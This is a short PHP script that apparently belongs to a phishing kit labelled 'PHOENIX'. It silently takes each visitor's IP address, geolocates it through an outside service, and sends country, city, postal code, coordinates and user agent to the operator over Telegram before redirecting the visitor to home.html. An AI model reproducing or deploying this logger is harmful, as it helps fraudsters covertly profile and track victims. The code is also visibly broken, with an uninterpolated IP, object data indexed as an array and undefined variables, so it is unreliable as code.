<?php
require("config/config.php");

$ip = getenv("REMOTE_ADDR");

$result = json_decode(file_get_contents('http://ip-api.io/json/.$ip'));
var_dump($result);


    //Fetching HTML Values
    $country_code  = $result['country_code'];
    $country_name  = $result['country_name'];
    $city        = $result['city'];
    $region_code    = $result['region_code'];
    $region_name         = $result['region_name'];
    $zip_code       = $result['zip_code'];
    $latitude     = $result['latitude'];
    $longitude    = $result['longitude'];
    $time_zone  = $result['time_zone'];



            //Telegram send
            $message = "**NEW-PHOENIX-VISITOR\n";
            $message .= "User-!P : ".$ip."\n";   
            $message .= "----------------------------------------\n";
            $message .= "Country code: ".$result['country_code']."\n";
            $message .= "----------------------------------------\n";
            $message .= "Country: ".$_POST['country_name']."\n";
            $message .= "----------------------------------------\n";
            $message .= "GeoID: ".$json['GeoID']."\n";
            $message .= "----------------------------------------\n";
            $message .= "State: ".$_POST['region_name']."\n";
            $message .= "----------------------------------------\n";
            $message .= "State Code: ".$result['region_code']."\n";
            $message .= "----------------------------------------\n";
            $message .= "City: ".$json['city']."\n";
            $message .= "----------------------------------------\n";
            $message .= "Postal: ".$json['zip_code']."\n";
            $message .= "----------------------------------------\n";
            $message .= "Latitude: ".$result['latitude']."\n";
            $message .= "----------------------------------------\n";
            $message .= "Longitude: ".$json['longitude']."\n";
            $message .= "----------------------------------------\n";
            $message .= "Requested IP: ".$json['RequestedIP']."\n";
            $message .= "----------------------------------------\n";
            $message .= "User-Agent: ".$browser."\n";
            $message .= "----------------------------------------\n";
            $message .= "Date : $adddate\n";
            send_telegram_msg($message);
    
    
    
            //Output
            header("location:home.html");
?>